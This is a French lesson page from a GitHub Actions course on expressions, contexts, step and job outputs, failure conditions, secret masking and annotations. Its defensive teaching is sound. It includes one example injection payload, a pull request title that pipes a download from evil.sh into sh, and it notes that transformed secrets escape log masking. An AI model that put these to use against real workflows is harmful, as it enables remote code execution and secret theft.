---
title: 4. Expressions, contextes et outputs
description: Expressions ${{ }} et contextes, variables d'environnement, outputs de steps et de jobs, conditions après un échec, secrets masqués et annotations.
sidebar:
  order: 4
---

## Deux sortes de substitution

La [leçon 1](../01-first-workflow/) a montré que `${{ github.event_name }}` était déjà remplacé dans le script exécuté par le runner, alors que `$RUNNER_OS` était développé par bash. Ne confonds pas les deux :

| | `${{ expression }}` | `$VAR` / `$env:VAR` |
|---|---|---|
| Évalué par | GitHub, avant l'exécution du step | le shell, pendant l'exécution du step |
| Peut lire | les contextes : `github`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `steps`, `needs`, `job`, `runner` | les variables d'environnement |
| Autorisé dans | presque n'importe quelle valeur du YAML, et `if:` | uniquement dans les scripts |
| Analogie C# | un générateur de source : le texte est produit avant la compilation | une variable lue à l'exécution |

Comme `${{ }}` colle du texte dans le script, n'y mets **jamais** directement de valeurs non fiables — un titre de pull request comme `"; curl evil.sh | sh; echo "` deviendrait du code shell. Passe-les par `env:` et lis `$VAR` à la place. La [leçon 7](../07-security/) exécute l'injection pour de vrai.

## Le workflow

[`.github/workflows/gha-04-data.yml`](https://github.com/spareilleux/learn/blob/main/.github/workflows/gha-04-data.yml) :

```yaml
# GitHub Actions course, lesson 4: expressions, contexts, environment, outputs, conditions
name: "GHA 04: data between steps and jobs"

on:
  workflow_dispatch:
    inputs:
      fail:
        description: Make the test step fail
        type: boolean
        default: false
  push:
    branches: [main]
    paths: ['.github/workflows/gha-04-data.yml']

env:
  COURSE: github-actions

jobs:
  produce:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.value }}
    env:
      LESSON: '04'
    steps:
      - name: Expressions and contexts
        run: |
          echo "course=$COURSE lesson=$LESSON"
          echo "run ${{ github.run_number }}, attempt ${{ github.run_attempt }}"
          echo "is main: ${{ github.ref == 'refs/heads/main' }}"
          echo "upper: ${{ format('{0}-{1}', env.COURSE, env.LESSON) }}"

      - name: Compute a version
        id: version
        run: echo "value=1.0.${{ github.run_number }}" >> "$GITHUB_OUTPUT"

      - name: Export a variable for later steps
        run: echo "BUILD_LABEL=build-${{ steps.version.outputs.value }}" >> "$GITHUB_ENV"

      - name: Read it back
        run: echo "BUILD_LABEL is $BUILD_LABEL"

      - name: A secret is masked in logs
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "token length: ${#TOKEN}"
          echo "token: $TOKEN"

      - name: Tests (fail on demand)
        run: |
          if [ "${{ inputs.fail }}" = "true" ]; then
            echo "::error file=code/github-actions/dotnet/Slugs/Slug.cs,line=9::Pretend a test failed"
            exit 1
          fi
          echo "tests passed"

      - name: Only on failure
        if: failure()
        run: echo "a previous step failed"

      - name: Always
        if: always()
        run: |
          echo "job status: ${{ job.status }}"
          echo "### Version ${{ steps.version.outputs.value }}" >> "$GITHUB_STEP_SUMMARY"

  consume:
    needs: produce
    runs-on: ubuntu-latest
    steps:
      - run: echo "version from produce = ${{ needs.produce.outputs.version }}"
```

## Exécution 1 : tout passe

Le premier step, tel que le runner l'a reçu et tel qu'il a affiché :

```text
echo "course=$COURSE lesson=$LESSON"
echo "run 1, attempt 1"
echo "is main: true"
echo "upper: github-actions-04"
course=github-actions lesson=04
run 1, attempt 1
is main: true
upper: github-actions-04
```

- `env:` au niveau du workflow (`COURSE`) et au niveau du job (`LESSON`) sont tous deux devenus des variables d'environnement ; en cas de conflit de noms, le niveau le plus spécifique l'emporte.
- `github.run_number` compte les exécutions **de ce workflow** (1 ici, il est nouveau) ; `run_attempt` augmente quand tu cliques sur *Re-run*.
- `==` renvoie `true` / `false` ; `format()` est l'une des fonctions intégrées, avec `contains()`, `startsWith()`, `toJSON()`, `hashFiles()`…

### Transmettre des données entre steps

Deux fichiers spéciaux s'en chargent :

| Écrire dans | Syntaxe | Lire ensuite avec |
|---|---|---|
| `$GITHUB_OUTPUT` | `name=value` | `${{ steps.<id>.outputs.<name> }}` (le step a besoin d'un `id`) |
| `$GITHUB_ENV` | `NAME=value` | `$NAME` dans les steps **suivants** (pas le step courant) |

```text
echo "value=1.0.1" >> "$GITHUB_OUTPUT"
echo "BUILD_LABEL=build-1.0.1" >> "$GITHUB_ENV"
...
  BUILD_LABEL: build-1.0.1
BUILD_LABEL is build-1.0.1
```

À partir du step qui suit l'export, le log liste `BUILD_LABEL` dans le bloc `env:` du step.

### Transmettre des données entre jobs

Les jobs s'exécutent sur des machines différentes, donc un output de step doit être **déclaré** comme output du job (`jobs.produce.outputs.version`), et le consommateur doit déclarer `needs: produce` :

```text
version from produce = 1.0.1
```

Sans `needs`, `consume` démarrerait en même temps que `produce` et `needs.produce` n'existerait pas.

### Les secrets sont masqués

```text
  TOKEN: ***
token length: 377
token: ***
```

Le runner remplace chaque occurrence de la valeur d'un secret par `***` dans les logs, même quand un script l'affiche. La longueur fuit quand même — et le masquage repose sur la valeur exacte : un secret transformé par le script (encodé en base64, découpé, inversé) n'est pas reconnu. Le masquage protège des accidents, pas d'un step malveillant.

## Exécution 2 : échec sur demande

```powershell
gh workflow run gha-04-data.yml --field fail=true
```

```text
if [ "true" = "true" ]; then
  echo "::error file=code/github-actions/dotnet/Slugs/Slug.cs,line=9::Pretend a test failed"
  exit 1
fi
##[error]Pretend a test failed
##[error]Process completed with exit code 1.
```

Ce qui est arrivé aux steps et aux jobs suivants :

```text
produce  failure
  Tests (fail on demand)  failure
  Only on failure         success
  Always                  success
consume  skipped
```

- Chaque step a un `if: success()` implicite : après un échec, les steps normaux sont ignorés. `failure()` ne s'exécute que si un step précédent a échoué ; `always()` s'exécute quoi qu'il arrive — y compris après une annulation.
- `job.status` valait `failure` dans le step `Always` : `echo "job status: failure"`.
- `consume` a été **ignoré** (skipped), pas mis en échec : `needs` implique aussi le succès. Écris `if: always()` sur le job (ou `if: ${{ !cancelled() }}`) pour l'exécuter malgré tout.

### Annotations

`::error file=…,line=…::message` est une **commande de workflow** : le runner la transforme en annotation attachée à ce fichier et à cette ligne, visible dans le résumé de l'exécution et dans l'onglet *Files changed* de la pull request. Par l'API :

```powershell
gh api repos/spareilleux/learn/check-runs/<job-id>/annotations --jq '.[] | "\(.annotation_level) \(.path):\(.start_line) \(.message)"'
```

```text
failure .github:14 Process completed with exit code 1.
failure code/github-actions/dotnet/Slugs/Slug.cs:9 Pretend a test failed
```

`::warning` et `::notice` fonctionnent de la même façon. Et `$GITHUB_STEP_SUMMARY` accepte du Markdown : la ligne `### Version 1.0.2` du step `Always` apparaît comme titre sur la page de résumé de l'exécution.

## À retenir

- `${{ }}` est évalué par GitHub et collé sous forme de texte ; `$VAR` est lu par le shell. Les valeurs non fiables passent par `env:`.
- `$GITHUB_OUTPUT` → `steps.<id>.outputs` ; `$GITHUB_ENV` → variables pour les steps suivants ; `outputs` du job + `needs` → données entre jobs.
- Après un échec, seuls les steps `failure()` et `always()` s'exécutent, et les jobs dépendants sont ignorés.
- Les secrets sont masqués par valeur dans les logs, ce qui est un filet de sécurité, pas une frontière de sécurité.
- `::error file=,line=::` crée des annotations ; `$GITHUB_STEP_SUMMARY` écrit le résumé de l'exécution.

## Exercices

1. Dans le step `Export a variable for later steps`, ajoute `echo "now: $BUILD_LABEL"` après la ligne `>> "$GITHUB_ENV"`. Qu'est-ce que ça affiche ?

<details>
<summary>Solution</summary>

`now: ` suivi de rien. Vérifié avec [`gha-04-exercises.yml`](https://github.com/spareilleux/learn/blob/main/.github/workflows/gha-04-exercises.yml) :

```text
now: 
next: build-1
```

`$GITHUB_ENV` est lu par le runner **entre** les steps : la variable existe à partir du step suivant. Dans le même step, utilise une variable shell normale.

</details>

2. Fais en sorte que `consume` s'exécute même quand `produce` échoue, mais pas quand l'exécution est annulée. Que contiendra `needs.produce.outputs.version` après l'exécution en échec ?

<details>
<summary>Solution</summary>

Extrait de [`.github/workflows/gha-04-exercises.yml`, lignes 28-30](https://github.com/spareilleux/learn/blob/93f6f82/.github/workflows/gha-04-exercises.yml#L28-L30) :

```yaml
  consume:
    needs: produce
    if: ${{ !cancelled() }}
```

La version : elle a été écrite dans `$GITHUB_OUTPUT` avant le step en échec, et les outputs d'un job sont évalués à la fin du job, quel que soit son résultat. L'output d'un step qui ne s'est jamais exécuté est une chaîne vide. Le workflow de vérification déclare les deux, puis échoue entre les deux :

```text
produce result: failure
version: '1.0.1'
never:   ''
```

</details>

3. Un workflow s'exécute sur `pull_request` et affiche le titre avec `run: echo "Title: ${{ github.event.pull_request.title }}"`. Réécris le step de façon sûre.

<details>
<summary>Solution</summary>

```yaml
      - name: Show the title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "Title: $TITLE"
```

L'expression ne sert plus que de valeur à une variable d'environnement ; bash lit `$TITLE` comme une donnée et n'analyse jamais son contenu comme du code.

</details>

## Sources

- [Évaluer des expressions dans les workflows et les actions](https://docs.github.com/actions/reference/workflows-and-actions/expressions)
- [Référence des contextes](https://docs.github.com/actions/reference/workflows-and-actions/contexts)
- [Commandes de workflow pour GitHub Actions](https://docs.github.com/actions/reference/workflows-and-actions/workflow-commands)
- [Transmettre des informations entre jobs](https://docs.github.com/actions/how-tos/write-workflows/choose-what-workflows-do/pass-job-outputs)
- [Renforcement de la sécurité : comprendre le risque d'injection de scripts](https://docs.github.com/actions/concepts/security/script-injections)
